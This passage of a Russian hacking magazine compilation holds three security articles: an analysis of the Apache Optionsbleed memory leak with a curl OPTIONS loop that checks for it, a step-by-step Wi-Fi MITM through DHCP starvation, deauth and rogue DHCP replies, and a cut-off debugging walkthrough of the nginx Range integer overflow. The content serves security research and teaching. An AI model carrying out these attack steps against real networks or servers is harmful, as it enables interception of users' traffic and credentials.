аль ное киберпространство. Как это делать, читай в статье!
   Ска чать PDF


ЗАКЛЮЧЕНИЕ
Это пер вая часть из золотого фонда лучших ста тей ][акера. Подборка была
нацеле на на кодеров, аналитиков и ревер серов, имеющих дело как с обыч‐
ным соф том, так и с malware. Следи за обновлениями и читай вто рую часть,
пос вященную практическим пакетам хакер ского ремесла! Да, кстати, если
можешь  посоветовать  какой‐нибудь  интересный  матери ал  из  старых
«Хакеров» — не стесняйся писать в ком менты. Мы и сами с удовольстви ем
почита ем. :)
ВЗЛОМ



РАЗБИРАЕМ БАГ OPTIONSBLEED,
КОТОРЫЙ УГРОЖАЕТ БЕЗОПАСНОСТИ ВЕБ‐
СЕРВЕРА
                                                                                       aLLy
                                                                                   ONsec
                                                                                                @iamsecurity





По пулярность Apache дела ет потен циально опасным любой
баг в нем. В этой статье мы раз берем уяз вимость, которая
позволяет читать дан ные из участков памяти неверно нас‐
троенного веб‐сервера.


Optionsbleed далеко не так опа сен, как Heartbleed, поскольку работает лишь
на серверах с опре деленными нас тройками, да и объем уте кающих данных
невелик. Но этот баг — из тех, что интерес ны сами по себе: изучив его, ты
сможешь находить подобные или избегать их, если ты раз работчик.


СТЕНД
Для успешных испы таний нам нужен веб‐сер вер Apache версии 2.2.34 и ниже
или 2.4.27 и ниже, если речь идет о вет ке приложения 2.4.х. Чтобы сократить
вре мя  установки  и  нас тройки  сервера,  я рекомендую  взять  готовый
докер‐контейнер, в котором уже воссозда ны все условия, необходимые
для эксплуатации. Готовый файл, как водит ся, можешь найти у меня в репози‐
тории.


docker run ‐p80:80 ‐‐rm ‐‐cap‐add=SYS_PTRACE ‐‐security‐opt seccomp=
unconfined httpd:2.4.25

В контей нере установлен отладчик GDB. Если захочешь поиграться, то сна‐
чала убей работающий демон apache2, а затем запус ти новый через дебаг‐
гер.


pkill httpd
gdb httpd
run ‐X ‐d /usr/local/apache2/





                Подготов ка к отладке веб‐сервера




                         Optionsbleed назвали по ана логии с Heartbleed,
                        где тоже утекала память про цесса и ата кующий
                      мог ее читать. Options — от метода, которым про‐
                       изво дит ся ата ка.



ДЕТАЛИ
Уязвимость существует, ког да в директиве Limit использует ся несуществу‐
ющий или отключен ный метод HTTP. Например, раз работчик решил запретить
использовать PATCH, одна ко ошиб ся и соз дал такой .htaccess‐файл:


<Limit PATC>
</Limit>

В тестовом контей нере этот файл уже соз дан и находится в пап ке test
веб‐рута. Теперь пос мотрим, что про исхо дит, когда мы посылаем запрос OP‐
TIONS.


OPTIONS /test/ HTTP/1.1
Host: optionsbleed.visualhack

Каж дый раз, когда выполняется обработ ка входящего запроса, веб‐сер вер
создает для него request_rec. Это слож ная структура, которая содержит
информацию о несколь ких соеди нени ях. Сей час нас интересует только
apr_pool_t — пул памяти зап роса.


/include/httpd.h
787: /**
788:  * @brief A structure that represents the current request
789:  */
790: struct request_rec {
791:     /** The pool associated with the request */
792:     apr_pool_t *pool;

В арсенале Apache нет изощренных тех ник для уменьшения фрагмента ции,
уве личе ния эффективности и экономии памяти. Не используемая более
память даже освобож дается‐то не осо бенно часто.
  Вместо этого веб‐сервер лишь каж дый раз выбирает сле дующий дос‐
тупный указатель на начало блока сво бодной памяти независимо от объ ема,
который нуж но выделить в данный момент. Память выделяется начиная с пер‐
вого адреса сво бод ной памяти, а затем ука затель снова воз вращается
на этот адрес. В тот момент, когда выделенная память боль ше не нужна, она
не освобождается для повторно го использования. Вмес то этого механизм
очи щает весь пул request_rec пос ле завер шения сетевого подключения.
   Так как зап росы к серверу в большинстве своем невелики, такая схе ма
не толь ко не приводит к утечкам памяти, но даже способству ет умень шению
вре мени отве та, что очень важно для сайтов с высокой нагрузкой.
  При выполнении при веден ного выше зап роса OPTIONS на самом деле
выполняется несколь ко соединений с сер вером. Ког да обрабатывается пер‐
вый кон нект, выделя ется память для хра нения зап роса.


/modules/http/http_core.c
135: static int ap_process_http_async_connection(conn_rec *c)
136: {
137:     request_rec *r;
...
146:         if ((r = ap_read_request(c))) {
147:
148:             c‐>keepalive = AP_CONN_UNKNOWN;





        Указатель на память, выделен ную для структуры request_rec

Сервер просматривает директорию, которая указана в запросе, и, если там
есть файл .htaccess, он обрабатывается. За это отвечает функция ap_‐
parse_htaccess.


/server/config.c
2149: AP_CORE_DECLARE(int) ap_parse_htaccess(ap_conf_vector_t **
result,
2150:     request_rec *r, int override,
2151:     int override_opts, apr_table_t *override_list,
2152:     const char *d, const char *access_names)
2153: {
...
2223:     /* cache it */
2224:     new = apr_palloc(r‐>pool, sizeof(struct htaccess_result));

При парсинге дирек тивы Limit сервер раз мещает ее данные в адресном
прос транстве запроса. Часть памяти выделяется для хранения метода HTTP,
который указан в дирек тиве. В нашем случае это строка PATC.





    От ладка httpd на этапе парсинга директивы Limit из фай ла .htaccess

Фун кция ap_limit_section берет на себя ответственность за обработку
этой директивы.


/server/core.c
2230: AP_CORE_DECLARE_NONSTD(const char *) ap_limit_section(cmd_parms
 *cmd,
2231:     void *dummy,
2232:     const char *arg)
2233: {
...
2255:     /* Check for built‐in or module registered method number */
2256:     methnum = ap_method_number_of(method);
...
2261:     else if (methnum == M_INVALID) {
2262:         /* Method has not been registered yet, but resource
restriction
2263:         * is always checked before method handling, so
register it.
2264:         */
2265:         methnum = ap_method_register(cmd‐>pool,
2266:             apr_pstrdup(cmd‐>pool, method));

Ес ли метод, на который воз действует Limit, не найден, то вызывается фун‐
кция ap_method_register.





     Состояние сте ка на момент вызова фун кции ap_method_register

Это очень важ ная функция в контексте уязвимос ти, поэтому рассмотрим ее
под робнее. Переменная methods_registry представляет собой структуру
apr_hash_t, которая исполь зует хеш‐таб лицу для сох ранения и поис ка ука‐
зателей на данные.


/modules/http/http_protocol.c
723: AP_DECLARE(int) ap_method_register(apr_pool_t *p, const char *
methname)
724: {
725:     int *methnum;
726:
727:     if (methods_registry == NULL) {
728:         ap_method_registry_init(p);
729:     }
730:
731:     if (methname == NULL) {
732:         return M_INVALID;
733:     }

Вот из таких элементов состоит эта струк тура.


/apr/tables/apr_hash.c
75: struct apr_hash_t {
76:     apr_pool_t          *pool;
77:     apr_hash_entry_t   **array;
78:     apr_hash_index_t     iterator;  /* For apr_hash_first(
NULL, ...) */
79:     unsigned int         count, max, seed;
80:     apr_hashfunc_t       hash_func;
81:     apr_hash_entry_t    *free;  /* List of recycled entries */
82: };

Сре ди них есть массив — хеш‐таб лица (строка 77), каждый из эле ментов
которой указывает на узел с несколь кими последовательно идущими зна‐
чени ями. Структура данных каждого узла выглядит сле дующим образом.


/apr/tables/apr_hash.c
47: struct apr_hash_entry_t {
48:     apr_hash_entry_t *next;
49:     unsigned int      hash;
50:     const void       *key;
51:     apr_ssize_t       klen;
52:     const void       *val;
53: };

Те перь  вернемся  в  исполняемый  код.  Сервер  сначала  вызывает
apr_hash_get, что бы узнать, был ли зарегис три рован метод, указанный
в инструкции Limit. Для этого и выпол няет ся поиск в таб лице хешей.


/modules/http/http_protocol.c
735: /* Check if the method was previously registered. If it was
736: * return the associated method number.
737: */
738: methnum = (int *)apr_hash_get(methods_registry, methname,
739:     APR_HASH_KEY_STRING);





                Отладка фун кции ap_method_register

Что бы вызвать уязвимость, в директиве Limit дол жен быть указан метод,
который не зарегистри рован глобально (в нашем случае PATC). Поэтому
поиск  не  даст  результата  и  фун кция  для  его  регис трации  regis‐
ter_one_method будет выполнена.


/modules/http/http_protocol.c
740:     if (methnum != NULL)
741:         return *methnum;
...
754:     register_one_method(p, methname, cur_method_number);


/modules/http/http_protocol.c
663: /* internal function to register one method/number pair */
664: static void register_one_method(apr_pool_t *p, const char *
methname,
665:     int methnum)
666: {
...
670:     apr_hash_set(methods_registry, methname, APR_HASH_KEY_STRING
, pnum);

Дальше управле ние передается фун кции apr_hash_set, она запишет данные
о вновь зарегистри рованном методе и вызовет find_entry.


/apr/tables/apr_hash.c
374: APR_DECLARE(void) apr_hash_set(apr_hash_t *ht,
375:     const void *key,
376:     apr_ssize_t klen,
377:     const void *val)
378: {
379:     apr_hash_entry_t **hep;

Фун кция apr_hash_set используется для разных опе раций над хеш‐таб‐
лицами, таких как добавление или уда ление записей. Пос ледний параметр
val как раз определяет то, какая опе рация выполняется в хеш‐таблице
при вызове. Если val равен нулю, то найденный узел удаляется. Если val
не равен нулю и узел не существует, то выполняет ся опе рация соз дания
и встав ки узла в таблицу, если же он уже сущес твует — его переназначение.


/apr/tables/apr_hash.c
380:     hep = find_entry(ht, key, klen, val);
381:     if (*hep) {
382:         if (!val) {
383:             /* delete entry */
...
390:         else {
391:             /* replace entry */

Прежде чем хеш будет добавлен, область памяти выг лядит сле дующим обра‐
зом.


b http_protocol.c:670





                 Участок памяти до добав ления метода

Сей час в хеш‐таб лице уже имеется семь элемен тов. А указатель стоит
на сле дующий свобод ный элемент — 8. Когда сервер обрабатывает дирек‐
тиву Limit, в массив добавляется еще один узел, который в ней указан.





        До бав ленный в массив элемент PATC из директивы Limit

Пос ле успешной обработки и регис тра ции нового метода сервер генери рует
пакет ответа и отправ ляет его. Пул зап роса осво бождается. Однако все дан‐
ные, которые были записаны в память во время работы, остаются на месте.
Все указате ли на methods_registry и на PATC все еще там.


/server/eor_bucket.c
84: static void eor_bucket_destroy(void *data)
85: {
86:     request_rec *r = (request_rec *)data;
87:
88:     if (r) {
89:         /* eor_bucket_cleanup will be called when the pool gets
destroyed */
90:         apr_pool_destroy(r‐>pool);
91:     }
92: }





        Данные в памяти не очи щаются пос ле освобождения пула

Ме неджер памяти не перезаписывает данные, которые остались в ней после
окончания работы с первым коннектом и освобождения пула, что мы и наб‐
людаем в отладчике.
  На этом первый этап обработки закончен, и самое время переходить
ко вто рому. При парсинге запроса управление передается в функцию apr_p‐
memdup.


apr_strings.c
113: APR_DECLARE(void *) apr_pmemdup(apr_pool_t *a, const void *m,
apr_size_t n)
114: {
...
119:     res = apr_palloc(a, n);
120:     memcpy(res, m, n);
121:     return res;

Так как память, которая была использована в пер вом шаге, теперь помече на
как сво бод ная, то apr_palloc (стро ка 119) выбира ет один из освободив‐
шихся адре сов в этой области. Дальше с помощью функции memcpy копиру‐
ются данные, начиная с адреса, который вернула apr_palloc. Причем раз‐
мер (n) этих данных таков, что они перезаписывают сущес тву ющие ячей ки
памяти, в которых хранилась информация о методе PATC из первого кон‐
некта.





      Пе реза писан ные данные о зарегистри рованном методе PATC

Затем сер вер переназначает узлы в таблице хешей. Так как часть памяти,
которая отве чает за метод PATC, была перезаписа на нулем, теперь указатель
ведет на пустую стро ку и значение val, равное нулю.





  Так выглядит участок памяти, где рань ше рас полагалась информация
  о PATC

Наконец, когда сер вер начинает генерировать ответ на HTTP OPTIONS, он
переходит в функцию make_allow. Ее роль заключается в соз дании строки
методов, которые под держивает веб‐сер вер. В этой функции есть перемен‐
ная mask — это критерий, используемый, чтобы определить, какие узлы
в хеш‐таб лице удовлетворяют требуемым условиям. В нашем случае mask
име ет значение 37.


/modules/http/http_protocol.c
1023: static char *make_allow(request_rec *r)
1024: {
1025:     apr_int64_t mask;
...
1032:     mask = r‐>allowed_methods‐>method_mask;





  Значение переменной mask, по которой отби раются нужные элементы
  для формирования хидера Allow

Тип переменной mask объявлен как apr_int64_t. Если мы име ем зна‐
чение 37 (в двоичной системе 100101), то для того, чтобы узел соответс тво‐
вал условию филь тра маски, его значение дол жно быть 0, 2 или 5. Узел,
который раньше был методом PATC, изначально не под ходит под это условие,
однако зна чение val было перезаписано нулями при помощи memcpy, и он
ста новит ся очень даже подходящим.
   Даль ше все это передается в переменную allow. Так как в нашем случае
элементы пус ты, то и в ответе, в хидере Allow можно наблюдать несколько
пустых значений, разделенных запятыми. А вот в реаль ных проектах тут могут
быть инте ресные данные.


ЭКСПЛОИТ
Су ществует PoC‐эксплоит, который делает несколько запросов на указанный
в параметрах url, определяет, уязвим ли сервер, и выводит заголовок Allow.
  Впрочем, для про вер ки уязвимос ти никакой эксплоит не нужен, все можно
сде лать обычно при помощи curl.


for i in {1..10}; do curl ‐sI ‐X OPTIONS http://url/path/; done





              Успешная эксплу атация Apache Optionsbleed


ЭКСПЛУАТИРУЕМ УЯЗВИМОСТЬ (ВИДЕО)





ПАТЧ И ВЫВОДЫ
Разработ чики из Apache Software Foundation оператив но отре агировали
на уязвимость и выпустили патч, который устраняет уязвимость. По сути, они
прос то зап ретили регис тра цию новых HTTP‐методов через директиву Limit.
Теперь вместо это го выводится сообщение об ошибке.


/server/core.c
2234: AP_CORE_DECLARE_NONSTD(const char *) ap_limit_section(cmd_parms
 *cmd,
...
2265:         else if (methnum == M_INVALID) {
2266:             /* Method has not been registered yet, but
resource restriction
2267:              * is always checked before method handling, so
register it.
2268:              */
2269:             if (cmd‐>pool == cmd‐>temp_pool) {
2270:                 /* In .htaccess, we can't globally register
new methods. */
2271:                 return apr_psprintf(cmd‐>pool, "Could not
register method '%s' "
2272:                     "for %s from .htaccess configuration",
2273:                     method, cmd‐>cmd‐>name);
2274:             }

Вообще, документация не рекомендует исполь зовать .htaccess, чтобы
менять конфигура цию, так как это сильно пов лияет на эффективность ответов
сервера. Теоретически фай лы .htaccess должны использоваться только
для осо бых случаев, когда разрешения уста навлива ются на данные в кон‐
крет ном каталоге. Только вот я не видел, чтобы эти рекомендации кто‐то
строго соблюдал в реальности. :‐)
ВЗЛОМ





         ПРОВОРАЧИВАЕМ ХИТРОУМНУЮ
                 MITM‐АТАКУ В WI‐FI‐СЕТИ





                                                                      Владимир Иванов





Атака «человек посередине», пожалуй, первое, что приходит
на ум, когда возникает задача получить пользовательские
дан ные, такие как логины и пароли к раз личным сервисам,
а также передаваемую информацию: поч ту, сооб щения мес‐
сен дже ров и прочее. ARP‐спуфинг, DNS‐спуфинг, ICMP‐
редирект, Evil twin — про все эти техники ты уже, возможно,
слышал. В дан ной статье я рас скажу тебе про еще один спо‐
соб устро ить MITM в  Wi-Fi-сети, не самый простой,
но работоспособ ный.




                  Ма тери ал адpесован специалистам по безопас‐
                       ности и тем, кто собираeтся ими  стать. Вся
                    информа ция   предос тавлена   исключительно
                        в ознакоми тельных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный материалами дан ной статьи.


Настоятельно рекомендую, прежде чем читать материал, ознакомиться с дру‐
гой моей публикаци ей, в которой я попытал ся объяснить принцип работы
про токо ла DHCP и как с его помощью ата ковать клиенты и сервер, ведь
именно о DHCP сегодня и пой дет речь.


ПРЕАМБУЛА
Итак, как и всег да, для данной атаки есть пара огра ничений:
 1. Мы должны быть под клю чены к атакуемой точке дос тупа.
 2. У нас должна быть воз можность прослушивать широковещательный тра‐
  фик в сети и перехватывать широковещательные запросы DHCPDISCOV‐
   ER, DHCPREQUEST и  ARP,  что бы обнаружи вать конфлик ты адре сов
   в локальной сети.

Итак, как же это работает? Атака раз деля ется на несколько этапов:
 1. Произво дим ата ку DHCP Starvation.
 2. Отправляем Wi‐Fi Deauth пакеты.
 3. Перехватываем ARP‐запросы от клиентов, отвечаем на них, чтобы создать
   кон фликт IP‐адре сов и принудить кли ента отправить DHCPDECLINE.
 4. Перехватываем зап росы DHCPDISCOVER и DHCPREQUEST, отвечаем
   на них.
 5. Proﬁt!

Разберемся в этой схе ме попод робнее.


DHCP Starvation
Под клю чаемся к атакуемой Wi‐Fi‐сети и производим атаку DHCP Starvation
с целью пополнить пул свобод ных IP‐адресов. Для это го необходимо выпол‐
нить сле дующие шаги.
 1. Формируем и отправляем широко веща тельный DHCPDISCOVER‐запрос,
   при этом представ ляемся как DHCP relay agent. В поле giaddr (Relay agent
    IP) указываем свой IP‐адрес 192.168.1.172, в поле chaddr (Client MAC
   address) — рандомный MAC 00:01:96:E5:26:FC, при этом на канальном
   уровне в SRC MAC выставляем свой MAC‐адрес: 84:16:F9:1B:CF:F0.





                       DHCPDISCOVER
 2. Сер вер отвечает сооб щением DHCPOFFER агенту ретрансляции (нам)
   и предлагает клиенту с MAC‐адресом 00:01:96:E5:26:FC IP‐адрес
  192.168.1.156.





                        DHCPOFFER
 3. После   получе ния  DHCPOFFER   отправляем   широковещательный
  DHCPREQUEST‐зап рос, при этом в DHCP‐опции с кодом 50 (Requested
   IP address) выставляем предложенный клиенту IP‐адрес 192.168.1.156,
   в опции с кодом 12 (Host Name Option) — рандомную строку dBDXnOnJ.
  Важ но: значения полей xid (Transaction ID) и chaddr (Client MAC address)
   в DHCPREQUEST и DHCPDISCOVER должны быть одинаковыми, иначе
   сервер отбросит запрос, ведь это будет выг лядеть как другая транзакция
   от того же клиента либо другой клиент с той же транзакци ей.





                       DHCPREQUEST
 4. Сер вер отправ ляет аген ту ретран сляции сообщение DHCPACK. С этого
  момен та IP‐адрес 192.168.1.156 считается зарезервированным за кли‐
   ентом с MAC‐адре сом 00:01:96:E5:26:FC на 12 ч (время аренды
   по умол чанию).





                         DHCPACK





                       DHCP clients


Wi-Fi Deauth
Следующим шагом проводим Wi‐Fi Deauth. Работает эта схе ма при мерно так.





                                  Wi‐Fi Deauth

Под робнее о деаутен тификации клиентов в Wi‐Fi‐сети можно почитать здесь
и здесь.
  Переводим свободный беспроводной интерфейс в режим мониторинга:





                       Wlan1 set monitor mode

Отправ ляем  deauth‐пакеты  с  целью  отсоединить  атакуемого  клиента
84:16:F9:19:AD:14 Wi‐Fi‐сети ESSID: WiFi DHCP MiTM.





                       Send deauth packets


DHCPDECLINE
Пос ле того как кли ент 84:16:F9:19:AD:14 отсоеди нился от точки дос тупа,
вероятнее всего, он заново поп робует под клю читься к Wi‐Fi‐сети WiFi DHCP
MiTM и получить IP‐адрес по DHCP. Так как ранее он уже подклю чал ся к этой
сети, то будет отправлять только широковещательный DHCPREQUEST.





                  Send DHCPREQUEST after Deauth

Мы перехватываем запрос клиента, но отве тить быстрее точки дос тупа мы,
само собой, не успеем. Поэто му кли ент получает от DHCP‐сервера IP‐адрес,
полученный ранее: 192.168.1.102. Далее клиент с помощью протокола
ARP пытается обнаружить конфликт IP‐адресов в сети.





                            Try detect IP address conﬂict

Ес тественно, такой запрос широко веща тельный, поэтому мы можем его
перехватить и отве тить на него.





                            IP address conﬂict detected

Пос ле это го клиент фиксирует конфликт IP‐адресов и отправляет широко‐
вещательное сообщение от каза DHCP — DHCPDECLINE:





                       Send DHCPDECLINE



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ





         ПРОВОРАЧИВАЕМ ХИТРОУМНУЮ
                 MITM‐АТАКУ В WI‐FI‐СЕТИ





DHCPDISCOVER
Итак, последний этап ата ки. После отправки DHCPDECLINE клиент с самого
начала проходит процеду ру получения IP‐адреса, а именно отправляет
широковещательный DHCPDISCOVER. Легитим ный DHCP‐сервер не может
отве тить на этот запрос, так как пул свободных IP‐адресов переполнен пос ле
про веде ния ата ки DHCP Starvation и поэтому заметно тор мозит, зато
на DHCPDISCOVER можем отве тить мы — 192.168.1.172.
   Клиент 84:16:F9:19:AD:14 (Win10‐desktop) отправляет широковеща‐
тель ный DHCPDISCOVER.





                      DHCPDISCOVER

Отвечаем DHCPOFFER.





                             Attacker DHCPOFFER

В DHCPOFFER мы предложили кли енту IP‐адрес 192.168.1.2. Клиент,
получив данное предложение толь ко от нас, отправ ляет DHCPREQUEST,
выставляя при этом в requested ip зна чение 192.168.1.2, и мы отве чаем
DHCPACK.
   Клиент 84:16:F9:19:AD:14 (Win10‐desktop) отправляет широковеща‐
тель ный DHCPREQUEST.





                      DHCPREQUEST

Отвечаем DHCPACK.





                               Attacker DHCPACK

Кли ент принимает наш DHCPACK и в качес тве шлюза по умол чанию
и DNS-сервера выставля ет наш IP‐адрес: 192.168.1.172, а DHCPNACK
от точ ки дос тупа, присланный на две секунды поз же, просто про игнорирует.





                               Client network settings

Вопрос: почему точ ка дос тупа прислала DHCPOFFER и DHCPNACK на две
секун ды поз же, да еще и предложила тот же IP‐адрес 192.168.1.102,
ведь кли ент отказался от него?





                    DHCPOFFER from AP

Что бы отве тить на этот вопрос, немного изменим фильтр в Wireshark и пос‐
мотрим ARP‐зап росы от точки дос тупа.





                     Add ARP requests from AP

Ответ: после проведения атаки DHCP Starvation у DHCP‐сервера не ока‐
залось свободных IP‐адресов, кроме того, от которо го отказал ся один из кли‐
ентов: 192.168.1.102. Поэтому, получив DHCPDISCOVER‐запрос, DHCP‐
сервер в течение двух секунд отправляет три ARP‐зап роса, что бы узнать, кто
использует IP‐адрес 192.168.1.102, и пос ле того, как сервер убедится, что
данный IP‐адрес свободен, пос кольку никто не ответил, выдает его клиенту.
Но уже слишком поздно: зло умышленник успел ответить быс трее.


РЕЗУЛЬТАТЫ
Таким образом, мы можем выставлять любые сетевые параметры: шлюз
по умолчанию, DNS‐сервер и другие — любому подключенному или новому
клиенту в атакуемой Wi‐Fi‐сети, при усло вии, что мы к ней уже подключены
и можем прос лушивать широковещательный трафик.





         Ви део про ведения атаки на macOS Sierra и Windows 10




Ну и конечно же, PoC.



ПОСЛЕСЛОВИЕ. APPLE VS DHCP
Как оказалось, macOS и iOS переп люнули всех в плане получе ния сетевых
нас троек по про токолу DHCP. Ког да эти опе раци онные сис темы отправляют
DHCPREQUEST, DHCP‐сер вер отвечает им DHCPACK, и они выставляют
сетевые настройки из ответа сер вера. Вроде пока все как у всех:





                   MacOS legal DHCPACK

Но проблема в том, что DHCPREQUEST широковещательный и злоумыш‐
ленник, как правило, без осо бых проблем может его перехватить и ответить
DHCPACK, но, конечно, позднее легитим ного DHCP‐сервера, то есть ответ
злоумышленника приходит вто рым. Все остальные DHCP‐клиенты на других
ОС просто про игнорируют вто рой DHCPACK, но на macOS и iOS все не так.
   Как ты думаешь, какие настрой ки выставляют данные операционные сис‐
темы? Ответ: те настройки, которые будут содержать ся в DHCPACK зло умыш‐
ленника (во вто ром DHCPACK во втором DHCPACK, Карл!).





                  MacOS attacker DHCPACK





        Видео демонстрации уязвимости DHCP‐клиента macOS

Как ты думаешь, баг это или фича? Я подумал — баг и на всякий слу чай завел
заяв ку на Apple Bug Reporter. Скоро этой заявке исполнится месяц, но ни
одного ком ментария от специалис тов Apple я так и не получил.





                           Apple Bug Reporter

На заявке в Apple Bug Reporter я не остановился и написал письмо в product‐
security@apple.com.





                               Apple email

Спе циалисты Apple совсем не быстро, но все же ответили и сказали, что их
DHCP‐клиент работает в соответс твии с RFC 2131. То есть это не бага,
а фича — вот и конец исто рии.




Для самых ленивых я подготовил скрипт apple_wiﬁ_mitmer.py, который в авто‐
мати ческом режиме находит все устрой ства компании Apple в Wi‐Fi‐сети,
деаутентифицирует и выставляет на них в качестве шлюза и DNS‐сервера
свой IP‐адрес.
  В  аргументах  скрип та  все го‐то  нуж но  ука зать имя  беспроводного
интерфейса, который уже подклю чен к исследуемой Wi‐Fi‐сети, и еще один
беспроводной интерфейс для отправки deauth‐пакетов. Как это работа ет,
можно пос мотреть тут.
ВЗЛОМ





                       РАЗБИРАЕМ УЯЗВИМОСТЬ
                                INTEGER OVERFLOW
                          В ВЕБ‐СЕРВЕРЕ NGINX





                                                                                       aLLy
                                                                                   ONsec
                                                                                                @iamsecurity





В популярнейшем веб‐ и прокси‐сер вере nginx была обна‐
руже на занят ная уязвимость: спе циально сформированным
зап росом можно получить информацию о внутренней струк‐
туре при ложения. Этот баг томился без малого десять лет,
и под верже ны ей версии с 0.5.6 и до 1.13.2 вклю читель‐
но — то есть с 2007 года по июль 2017‐го. Nginx, как извес‐
тно, используется на каждом третьем‐четвертом сай те, так
что изучить эту лазейку не помешает.




                  Ма тери ал адpесован специалистам по безопас‐
                       ности и тем, кто собираeтся ими  стать. Вся
                    информа ция   предос тавлена   исключительно
                        в ознакоми тельных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный материалами дан ной статьи.



ТЕСТОВЫЙ СТЕНД
Для про веде ния эксперимен тов нам понадо бится тестовая площадка. Конеч‐
но, всег да можно самому установить и нас троить нужный дистри бутив,
но зачем, ког да можно просто взять и сразу перейти непосредственно к опы‐
там? Тем более наши китай ские коллеги уже соб рали готовую уязвимую сре‐
ду и выложи ли ее в виде докер‐кон тей нера. Скачать его мож но из репози‐
тория vulapps. На странице полно иероглифов, так что вот тебе команда,
которая нужна для запуска сервера:


docker run ‐‐rm ‐‐cap‐add=SYS_PTRACE ‐‐security‐opt seccomp=unconf
ined ‐d ‐p 80:80 medicean/vulapps:n_nginx_1

Вообще, в этом репозитории ютится множество стен дов для тес тирования
раз ных уязвимостей, советую изучить на досуге.
  После успешного выполнения коман ды на 80‐м порте у нас будет висеть
подопыт ный веб‐сервер nginx версии 1.13.1.
   Если вдруг тебе захочется немного подебажить, то рекомендую приатта‐
чить ся к контей неру и выполнить


apt‐get update && apt‐get install nano build‐essential gdb nginx‐dbg=
1.13.1‐1~stretch
service nginx stop && service nginx‐debug start
ps ‐aux|grep nginx

Те перь можно присоеди нять ся к процессу (worker process) с помощью gdb.


gdb ‐‐pid <pid>

Сра зу пре дуп реждаю,  что импакт  у  уязвимости невесть  какой, однако
покопать ся в ней интерес но.


НЕМНОГО О RANGE
При чина уязвимос ти — в некорректной обра ботке бай товых диапазонов
в заголовке Range. Возможно, ты в курсе, что это такое, но давай на вся кий
слу чай повторим.




              Ба зовая информация о заголовке Range

Заголо вок Range исполь зуется, ког да нужно получить не полный ответ от сер‐
вера, а только его часть. Формат допустимых зна чений заголовка подробно
описан в спе цификации про токо ла HTTP 1.1 RFC2616.
   Согласно стандарту, в качес тве значений мож но указывать диапазоны
для выбор ки. Они состоят из двух частей: размерность диапазона и спи сок
правил выборки. В качес тве размерности используются байты.


Range: bytes=[‐]<begin>‐[<end>][,]

Са му выборку можно делать двумя способами. Первый — указать две
позиции: начало выборки и ее конец. При чем стандарт четко определяет, что
начальная позиция дол жна быть не меньше нуля, а конечная обязатель но
боль ше начальной или равна ей. Если это условие не соблюда ется, то
заголо вок дол жен быть проигно рирован. Если в качес тве пос ледней позиции
указано значение, которое больше размера запрашива емого документа
или рав но ему, то пос ледней позицией считается текущий размер документа
в байтах минус один. То же самое каса ется тех случаев, когда конечная
позиция не указана вообще.
  К при меру, если размер документа 138 байт, то bytes=1‐137 получит
от сер вера 137 байт информации, начиная со вто рого и заканчивая пос‐
ледним.





       Пер вый спо соб выбор ки части контента с помощью Range

По мимо это го, в ответе при сутству ет заголовок Content‐Range, где после
слеша указан полный размер документа, который мы запрашиваем.
   Вто рой спо соб — выборка пос ледних N байт тела документа. Если размер
документа меньше, чем ука занный в запросе, то будет выбран весь документ.
Нап ример, bytes=‐7 зап рашивает пос ледние 7 байт.





        Второй способ выборки части кон тента с помощью Range

Также спе цификация разреша ет в одном заголов ке Range ука зать несколько
диапазонов, в качестве раз делителя используется запятая.





    Использование несколь ких байтовых диапа зонов в заголовке Range

Отмечу, что если ответ сервера содержит заголовок Accept‐Ranges, то он
под держивает получе ние дан ных частями, ког да в зап росах есть хидер Range.
Но, конечно же, это не говорит со стоп роцентной вероятностью о его под‐
держке или ее отсутствии. Так что рекомен дую все про верять на прак тике.





  Наличие заголовка Accept‐Ranges говорит о поддержке Range в зап‐
  росах




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ





                       РАЗБИРАЕМ УЯЗВИМОСТЬ
                                INTEGER OVERFLOW
                          В ВЕБ‐СЕРВЕРЕ NGINX





Углубляемся в детали
В nginx за обработку заголовка Range отвечает модуль ngx_http_range_‐
header_filter_module, который вызывает функцию ngx_http_range_head‐
er_filter.


/src/http/modules/ngx_http_range_filter_module.c
146: static ngx_int_t
147: ngx_http_range_header_filter(ngx_http_request_t *r)
148: {

Ес ли в пакете ука зан только один диапа зон, то выводом информации занима‐
ется функция ngx_http_range_singlepart_header, а если несколько, то
ngx_http_range_multipart_header.


/src/http/modules/ngx_http_range_filter_module.c
404: static ngx_int_t
405: ngx_http_range_singlepart_header(ngx_http_request_t *r,
406:     ngx_http_range_filter_ctx_t *ctx)
...
455: static ngx_int_t
456: ngx_http_range_multipart_header(ngx_http_request_t *r,
457:     ngx_http_range_filter_ctx_t *ctx)
458: {

Сам баг находится в функции ngx_http_range_parse, которая пар сит
переданные в заголов ке диапазоны.


/src/http/modules/ngx_http_range_filter_module.c
268: static ngx_int_t
269: ngx_http_range_parse(ngx_http_request_t *r, ngx_http_range_
filter_ctx_t *ctx,
270:     ngx_uint_t ranges)

Что бы поближе посмотреть,  что происходит, приаттачимся  к процессу
с помощью gdb и поставим брейк‐пойнт на строку 360.


gdb ‐‐pid <pid>
b ngx_http_range_filter_module.c:360
c

Те перь отправим пакет, в котором переда дим отри цательный Range.


GET / HTTP/1.1
Host: nginx.visualhack
Range: bytes=‐10, ‐20

Сна чала опре деляется тип переданного диапазона. Если мы запросили
выбор ку последних N байт документа, то перемен ная suffix становится рав‐
ной единице.


/src/http/modules/ngx_http_range_filter_module.c
304:         suffix = 0;
...
308:         if (*p != '‐') {
...
334:         } else {
335:             suffix = 1;

Далее посим вольно перебирается передан ная стро ка с диапазоном. Пока
встре чаются значения от 0 до 9 (то есть числа), кусок кода выполняется.


/src/http/modules/ngx_http_range_filter_module.c
343:         while (*p >= '0' && *p <= '9') {
344:             if (end >= cutoff && (end > cutoff || *p ‐ '0' >
cutlim)) {
345:                 return NGX_HTTP_RANGE_NOT_SATISFIABLE;
346:             }
347:
348:             end = end * 10 + *p++ ‐ '0';
349:         }

Пос ле того как отработает этот цикл, переменная end будет равна передан‐
ному значению, только без знака минус. Пропустим несколько не особо инте‐
ресных для нас строк и попадем в усло вие, пос ле которого мы поставили
пре рывание.


/src/http/modules/ngx_http_range_filter_module.c
357:         if (suffix) {
358:             start = content_length ‐ end;
359:             end = content_length ‐ 1;
360:         }





                 Отладка запроса с хидером Range

Са мое время пос мотреть на переменные end, start и content_length.


p content_length
p start
p end

